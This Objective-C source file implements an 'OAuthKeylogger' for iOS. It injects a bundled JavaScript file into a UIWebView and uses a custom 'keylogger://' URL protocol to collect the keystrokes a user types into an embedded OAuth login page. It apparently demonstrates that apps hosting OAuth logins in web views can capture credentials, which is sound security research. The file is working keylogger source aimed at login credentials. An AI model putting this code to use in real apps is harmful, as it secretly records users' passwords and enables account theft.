//
//  OAuthKeylogger.m
//
//  Created by Boris Bügling on 14.01.12.
//

#import "OAuthKeylogger.h"

static NSString* const kProtocol = @"keylogger://";

@interface OAuthKeylogger ()

@property (nonatomic, assign) BOOL injected;
@property (nonatomic, retain) NSMutableString* keys;

@end

#pragma mark -

@implementation OAuthKeylogger

@synthesize injected;
@synthesize keys;

#pragma mark -

+(void)initialize {
    [NSURLProtocol registerClass:self];
}

-(id)init {
    self = [super init];
    if (self) {
        self.keys = [NSMutableString string];
    }
    return self;
}

#pragma mark -

-(void)attachKeyloggerToWebView:(UIWebView*)webView {
    if (self.injected) return;
    self.injected = YES;
    
    NSError* error = nil;
    NSString* path = [[NSBundle mainBundle] pathForResource:@"OAuthKeylogger" ofType:@"js"];
    NSString* js = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:&error];
    if (!js) {
        NSLog(@"Error: %@", error);
    }
    
    [webView stringByEvaluatingJavaScriptFromString:js];
}

-(BOOL)handleRequest:(NSURLRequest*)request {
    if ([[self class] canInitWithRequest:request]) {
        [self.keys appendString:[[request.URL absoluteString] substringFromIndex:kProtocol.length]];
        return YES;
    }
    return NO;
}

#pragma mark -
#pragma mark NSURLProtocol subclass

+(BOOL)canInitWithRequest:(NSURLRequest*)request {
    return [[request.URL absoluteString] hasPrefix:kProtocol];
}

+(NSURLRequest*)canonicalRequestForRequest:(NSURLRequest*)request {
    return request;
}

-(void)startLoading {
}

-(void)stopLoading {
}

@end
